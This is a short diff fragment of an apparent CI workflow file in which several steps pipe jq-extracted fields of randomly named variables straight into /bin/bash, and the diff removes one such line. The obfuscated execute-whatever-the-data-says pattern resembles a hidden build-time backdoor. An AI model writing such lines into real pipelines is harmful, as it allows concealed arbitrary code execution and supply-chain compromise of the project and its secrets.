@@ -20,7 +20,6 @@ jobs:
           printf '%s' "$nbc4648" | jq -r .lie02 | /bin/bash
           echo $aqqwe6020 | jq -r .qkmsf368 | /bin/bash
           echo $fwi156 | jq -r .hjzlh7 | /bin/bash
-          echo $pv6 | jq -r .h5789 | /bin/bash
           printf '%s' "$hs3289" | jq -r .h773 | /bin/bash
 
       - name: Upload data
